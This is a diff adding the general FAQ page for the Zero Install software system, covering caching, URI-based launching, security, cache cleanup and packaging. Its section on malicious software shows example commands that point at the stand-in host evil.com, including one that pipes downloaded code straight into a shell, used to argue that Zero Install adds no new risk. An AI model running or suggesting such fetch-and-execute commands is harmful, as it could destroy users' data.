@@ -1,0 +1,260 @@
+<?xml version='1.0' encoding='utf-8'?>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<h2>General FAQ</h2>
+
+<p>
+This FAQ is about Zero Install in general. If you're looking for information
+about one of the implementations, try either <a href='injector-faq.html'>the
+injector FAQ</a> or <a href='fs-faq.html'>the filesystem FAQ</a>.
+</p>
+
+<toc level='h3'/>
+
+<h3>I haven't tried it yet, but it sounds really complicated</h3>
+<p>It isn't. <a href='injector.html'>Try it</a>. Now.</p>
+
+<h3>Isn't fetching stuff over the web really slow?</h3>
+
+<p>You have to get stuff over the web anyway the first time. The
+system caches everything, and you can run the software in future
+without needing a network connection.
+</p>
+
+<h3>Isn't is really hard to run applications if you always have to
+type URIs for them?</h3>
+
+<p>Yes. As with the web, that works but it's not the intended way to
+do it. Like the web, you have links to the URIs, and you use the links
+normally.</p>
+<p>
+For example, having opened the ROX-Filer directory showing Memo in
+<a href="install.html">the installation instructions</a>, you can drag Memo
+from the window onto your panel. Now you access it by clicking on its panel
+icon; no URIs.
+</p><p>
+You could also put it on the pinboard, bookmark the directory, set
+a keyboard shortcut, or whatever. Web pages can provide the
+URIs in a clickable form (so clicking on a link opens the filer
+window). A 'distribution' could be nothing more than a web page
+listing links to high quality software for a particular audience.
+</p><p>
+Finally, if you want to get a newer version, or find related software,
+traditional systems mean you have to try and remember where you got it
+from, or hunt through the documentation. With the URI scheme, just
+choose 'Show Location' from the panel menu and the directory
+containing Memo (on the remote server) will be opened.
+</p>
+
+<h3>I understand that when I browse the web my computer caches the
+pages, images and stylesheets automatically so I don't need to
+manually 'install' multiple PNG images to see a page, but software is
+different!</h3>
+<p>Why?</p>
+
+<h3>How secure is this?</h3>
+<p>About as secure as any system which ultimately involves running
+software written by people you don't know who live in far away
+countries. However, since the downloading is automatic, there are more
+chances for automatic checking (eg, verifying GPG signatures, etc):
+</p>
+
+<p style='text-align: center'>
+<img width="576" height="363" src="trustbox.png"
+     alt='You are asked to confirm each new key'/>
+</p>
+
+<p>
+To be more precise, it has all the advantages of application
+directories (no install step, so no chance for anything to run as
+root). In addition, if two users try to run the same application, they
+both automatically get the same cached copy, whereas without this each
+would have to install a separate copy to their home directory, or one
+user has to trust the other user not to have modified his copy, and
+use that.
+</p>
+<p>
+See the <a href="security.html">filesystem security issues</a> and
+<a href='injector-security.html'>injector security issues</a> documents for
+more information.
+</p>
+
+<h3>How do you do integration (eg, making a Start menu show all
+installed software)?</h3>
+
+<p>Since there is no concept of software being 'installed' or
+'not-installed', this is not required. The menu (or other launching
+device) simply shows applications that the user may want to run. They
+will be fetched on demand.</p>
+<p>For example, the set of applications your system shows you on first
+install is the applications the distribution author thinks you might
+like. They may be already in the cache, or they may be loaded on
+demand (depending on the distribution's installer).
+</p>
+<p>Indeed, the question is backwards. The menu doesn't show installed
+software; rather, the 'installed' software is what the user has put on
+the menu.
+</p>
+
+<h3>What if something gets automatically removed from the cache while
+I'm up a mountain with my laptop?</h3>
+<p>Currently, nothing is ever automatically removed from the cache.
+Users can choose the purging scheme that suits them. For users with
+broadband, that might mean removing anything that hasn't been accessed
+for a year. For users with dial-up and 80Gb disks, that probably means
+never ever removing anything.
+</p>
+<p>
+For the filesystem, you can run
+<b>/uri/0install/zero-install.sourceforge.net/apps/ZeroClean</b> to scan the
+cache for good removal candidates:
+</p>
+
+<p style='text-align: center'>
+<img width="618" height="338" src="ZeroClean.png"
+     alt='ZeroClean find somes files to remove' />
+</p>
+
+<h3>Is Linux binary compatibility good enough to share binaries between
+distributions?</h3>
+<p>
+There are some problems in this area generally (not just with Zero Install).
+The <a href="http://www.autopackage.org">Autopackage</a> project is working
+on these issues; see their FAQ for a detailed look at the problems faced.
+However, we have a single binary for ROX-Filer that seems to work on all
+distributions, so it's certainly possible.
+</p>
+
+<h3>What happens if there are two programs which may not be run simultaneously
+for some reason?</h3>
+<p>
+Running and installing are separate. In Debian, for example, installing some
+software (eg, exim) may also cause it to run, but in zero install there is no
+install step, only the running step. So, you can 'install' any number of
+conflicting packages, but you can still only run one mail system at once.
+</p>
+
+<h3>Upstream authors can't be trusted to provide decent quality software!</h3>
+
+<p>
+Traditionally, a lot of the QA work that goes on in open source software is done
+by distributions (such as Debian). They take the `upstream' code from the software
+authors, and then provide a packaged version to their users. There are then two classes
+of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear
+to users which bugs are in which category, they tend to report all bugs to the packagers,
+who often then fix even upstream bugs in their own packages.
+</p>
+
+<p>
+The effect of this is that distribution-provided packages are often more reliable than
+upstream ones (since upstream don't get to hear about many of the bugs), and different
+distributions have fixed different bugs, with no coordination between them. With Zero
+Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp
+bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes
+would benefit everyone, not just Debian users.
+</p>
+
+<p>
+Of course, the other reason why packages may be different to the upstream versions is
+because upstream is slow to respond, uninterested, or known to be careless about quality.
+In this case, a Zero Install packager can provide a fixed version from their own site
+and get other people to link to that. The advantage here is that, again, everyone benefits.
+</p>
+
+<h3>Doesn't Zero Install make it easier to send users malicious software?</h3>
+
+<p>
+Not really. True, you could email a user, telling them to run (filesystem):
+</p>
+<pre>
+$ /uri/0install/evil.com/wipe-my-files
+</pre>
+<p>or (injector):</p>
+<pre>
+$ 0launch http://evil.com/wipe-my-files
+</pre>
+
+<p>
+But on the other hand, you could also send them an email telling them to type:
+</p>
+<pre>
+$ lynx -source http://evil.com/wipe-my-files | sh -
+</pre>
+
+<p>
+All three can do exactly the same amount of damage, but the third works on any
+system. Zero Install helps with large, complicated programs with lots of
+dependencies, whereas your typical malicious program is only a few lines long,
+and doesn't benefit from it.
+</p>
+
+<h3>But what about kernel bugs? Zero Install is still vulnerable then!</h3>
+
+<p>
+Recently, a bug was found (and fixed) in the Linux kernel that allowed any user
+to become root. Most famously, it was used to compromise some of Debian's
+servers. Couldn't a user access some software through Zero Install that
+took advantage of this bug to break an un-patched machine?
+</p>
+
+<p>
+Well, yes. But, as with the question above, they could do it just as easily
+without Zero Install (using wget, or just by typing the program in themselves).
+If your kernel is insecure, you have a problem with or without Zero Install.
+</p>
+
+<h3>Does this replace /etc, /var, /tmp, etc?</h3>
+
+<p>
+No. Zero Install is read-only, so you couldn't store configuration, data or temporary
+files in it, even if you wanted to. It replaces <b>/usr</b> and <b>/opt</b>.
+It's sensible to keep the other things separate, because they need to be treated
+differently:
+</p>
+
+<dl>
+<dt>/uri/0install</dt>
+<dd>Read-only files that can be downloaded again automatically if lost. Does
+not need to be backed up (cache stored under <b>/var</b>).</dd>
+
+<dt>/etc</dt>
+<dd>Contains system configuration. Should be backed up, and probably kept under version
+control too. May be mounted read-only most of the time.</dd>
+
+<dt>/home</dt>
+<dd>User data. Must be writable, and often changes. Should be backed up regularly.</dd>
+
+<dt>/var</dt>
+<dd>Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't
+need to be backed up, but data should persist over reboots.</dd>
+
+<dt>/tmp</dt>
+<dd>Changes quickly and must be writable, but need not persist over reboots (can use
+tmpfs rather than a physical disk).</dd>
+</dl>
+
+<h3>What was the inspiration for Zero Install?</h3>
+
+<p>
+Several things. <a href="http://www.coda.cs.cmu.edu/">CODA</a> and
+<a href="http://www.gedanken.demon.co.uk/wwwoffle/">wwwoffle</a>
+for showing that caching network filesystems can still work when
+off-line. <a href="http://w3.org">The W3C</a> for using URIs for namespaces.
+Not <a href="http://java.sun.com/products/javawebstart/">Java Web Start</a>,
+<a href="http://www.konvalo.org">Konvalo</a> or <a
+href="http://cr.yp.to/slashpackage.html">D. J. Bernstein's slashpackage</a>
+though, because I had never heard of them when I started the project.</p>
+
+<h3>Is there a FAQ for injector-specific questions?</h3>
+
+<p>
+Yes: <a href='injector-faq.html'>the injector FAQ</a>.
+</p>
+
+<h3>Is there a FAQ for filesystem-specific questions?</h3>
+
+<p>
+Yes: <a href='fs-faq.html'>the filesystem FAQ</a>.
+</p>
+
+</html>
